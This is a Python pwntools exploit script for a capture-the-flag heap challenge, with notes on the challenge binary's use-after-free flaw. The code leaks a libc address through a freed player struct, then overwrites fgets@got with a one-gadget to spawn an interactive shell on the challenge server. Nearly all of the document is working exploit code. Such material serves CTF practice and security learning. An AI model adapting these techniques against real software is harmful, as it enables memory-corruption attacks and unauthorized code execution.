from pwn import *
import sys

"""
Exploit notes:
Partial RELRO -> GOT writeable
No PIE: (0x400000)
exit@got: 0x6030A0

adding:
create a "player" struct on the heap of length 0x40.
create a description buffer on the heap of length strlen(description)+1 (fgets(s, 1024, stdin))
the first two dwords are index (printed) and score (changeable)
if an alias was given, create an alias structure on the heap of length 0x18

aliases aren't freed on deletion. able to reference freed player structure through alias.

when editing a player the description is overwritten,
if the strlen of old desc is <= strlen of new desc.
otherwise the old description is freed and a new buffer
is allocated with size strlen(new_description) + 1

idea:
add player A with 0x30 length description.
add player B with large description
delete the player B
edit player A and change description to length 0x40 (hope to reuse the player B struct)
let player A's description be a fake player struct with the description pointer pointing to some
good memory like exit@got.
print player B to leak some libc addresses.
calculate libc base
edit player B and write an address to jump to into the description
quit
"""

class MyFirstHeapExploit:
    def __init__(self, p):
        self.p = p
        self.p.recvuntil('> ')
    
    def add_player(self, name, description, alias):
        """
        Add a new player with given name, description and optional alias.
        Return the index of the player in the list.
        """
        self.p.sendline('add ' + alias)
        self.p.sendlineafter('player: ', name)
        self.p.sendlineafter('desc: ', description)
        self.p.recvuntil('player added (index: ')
        index = self.p.recvuntil(';')
        self.p.recvuntil('> ')
        return int(index[:-1])
    
    def edit_player_by_index(self, index, name, description, score):
        self.p.sendline('edit')
        self.p.sendlineafter('index: ', index)
        self.p.sendlineafter('player: ', name)
        self.p.sendlineafter('desc: ', description)
        self.p.sendlineafter('score: ', score)
        self.p.recvuntil('player updated (index: ')
        index = self.p.recvuntil(';')
        self.p.recvuntil('> ')
        return int(index[:-1])

    def edit_player_by_alias(self, alias, name, description, score):
        self.p.sendline('edit ' + alias)
        self.p.sendlineafter('player: ', name)
        self.p.sendlineafter('desc: ', description)
        self.p.sendlineafter('score: ', str(score))
        self.p.recvuntil('player updated (index: ')
        index = self.p.recvuntil(';')
        self.p.recvuntil('> ')
        return int(index[:-1])
    
    def delete_player_by_alias(self, alias):
        self.p.sendline('del ' + alias)
        self.p.recvuntil('> ')
    
    def delete_player_by_index(self, index):
        self.p.sendline('del')
        self.p.sendlineafter('index: ', index)
        self.p.recvuntil('> ')
    
    def show_player_by_alias(self, alias):
        self.p.sendline('show ' + alias)
        index, score, name, desc = self.parse_player_profile()
        self.p.recvuntil('> ')
        return index, score, name, desc
    
    def parse_player_profile(self):
        self.p.recvuntil('index:  ')
        index = int(self.p.recvline())
        self.p.recvuntil('player: ')
        name = self.p.recvline()
        self.p.recvuntil('desc:   ')
        desc = self.p.recvline()
        self.p.recvuntil('score:  ')
        score = int(self.p.recvline())
        return index, score, name, desc

    def increase_score_by_alias(self, alias, amount):
        self.p.sendline('inc ' + alias)
        self.p.sendlineafter('score: ', amount)
        self.p.recvuntil('(total: ')
        score = int(self.p.recvuntil(')'))
        self.p.recvuntil('> ')
        return score
    
    def get_player_with_highest_score(self):
        self.p.sendline('lead')
        index, score, name, desc = self.parse_player_profile()
        self.p.recvuntil('> ')
        return index, score, name, desc
    
    def quit(self):
        self.p.sendline("quit")

#context.log_level = 'debug'

if len(sys.argv) > 1:
    p = remote('challenge.pwny.racing', 11531)
    p.libc = ELF('./libc-2.27.so')
    magic_gadget_offs = 0x4f322
else:
    p = process('./chall6')
    magic_gadget_offs = 0x4484f

heap = MyFirstHeapExploit(p)
# Create a player with a smaller description than the player struct size
heap.add_player("A", "A"*0x30, "A")
# Create another player with a random big description to not interfere with the player-struct-sized chunks
heap.add_player("B", "B"*0x100, "B")
# Free the second player - the alias "B" is still accessible.
heap.delete_player_by_alias("B")

# index score name[48] description*
# Overwrite the description of player A with a "fake" player struct.
# The size of the description is equal to the player struct now,
# so malloc returns the last free'd matching chunk - which happens
# to be the one of player "B".
# Let the description pointer in the fake player struct point to fgets@got.
# Since strlen(description)+1 bytes are allocated, we have to send one byte less
# to match the size of 0x40. 64bit addresses usually have the highest byte 00, so just skip that.
fake_player = 'B'*(0x40 - 8) + p64(p.elf.got['fgets'])[:-1]
heap.edit_player_by_alias("A", "A", fake_player, 10)

# Leak the address of fgets in libc by showing the free'd player "B"
# and parsing the description. We can calculate the base address of libc now.
index, score, name, desc = heap.show_player_by_alias("B")
desc = desc[:-1]
desc += '\x00'*(8-len(desc))
fgets_leak = u64(desc)
log.success('fgets@got leak: {:x}'.format(fgets_leak))
libc_base = fgets_leak - p.libc.vaddr_to_offset(p.libc.symbols['fgets']) #0x7EB20
log.success('libc base: {:x}'.format(libc_base))

# Overwrite fgets@got with a magic gadget to pop a shell by overwriting the
# "description" of player "B".
# The next time fgets is called we'll have a shell.
magic_gadget = libc_base + magic_gadget_offs
heap.edit_player_by_alias("B", "B", p64(magic_gadget)[:-2], 1337)
p.interactive()